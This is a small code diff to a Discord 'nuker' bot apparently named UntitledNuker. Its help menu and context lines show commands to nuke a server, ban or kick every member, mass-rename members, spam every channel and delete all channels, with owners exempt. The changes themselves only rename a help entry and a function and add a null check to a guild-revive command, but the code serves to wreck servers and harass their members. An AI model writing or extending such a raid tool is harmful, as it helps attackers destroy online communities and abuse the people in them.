@@ -113,7 +113,7 @@ async def help(ctx):
     embed.add_field(name="Nuke", value=f"`{p}1 <ban 1/0> <your text>`", inline=False)
     embed.add_field(name="Ban everyone", value=f"`{p}2`", inline=False)
     embed.add_field(name="Kick everyone", value=f"`{p}3`", inline=False)
-    embed.add_field(name="Rename everyone nickname", value=f"`{p}4 <new nickname>`", inline=False)
+    embed.add_field(name="Rename everyone", value=f"`{p}4 <new nickname>`", inline=False)
     embed.add_field(name="Spam to all channels", value=f"`{p}5 <amount> <text>`", inline=False)
     embed.add_field(name="Spam to current channel", value=f"`{p}6 <amount> <text>`", inline=False)
     embed.add_field(name="Delete all channels", value=f"`{p}`7", inline=True)
@@ -189,7 +189,7 @@ async def kickEveryone(ctx):
             print(f"{msgs['info']} {m.name} is owner")
 
 @bot.command(name="4", aliases=["chen"])
-async def renameEveryoneNickname(ctx, *, name="UntitledNuker"):
+async def renameEveryone(ctx, *, name="UntitledNuker"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
         if str(m.id) not in owners:
@@ -288,12 +288,12 @@ async def editServerName(ctx, *, name="UntitledNuker"):
 @bot.command(name='13', aliases=["rg"])
 @commands.dm_only()
 async def reviveGuild(ctx, guildId: int=None):
-    await msg_delete(ctx)
-    guild = bot.get_guild(guildId)
-    try:
-        await guild.create_text_channel(name="UntitledNuker")
-        print(f"{msgs['+']} Revived {guild}")
-    except:
-        print(f"{msgs['error']} Can't revive {guild} :(")
+    if guildId:
+        guild = bot.get_guild(guildId)
+        try:
+            await guild.create_text_channel(name="UntitledNuker")
+            print(f"{msgs['+']} Revived {guild}")
+        except:
+            print(f"{msgs['error']} Can't revive {guild} :(")
 
 bot.run(token)
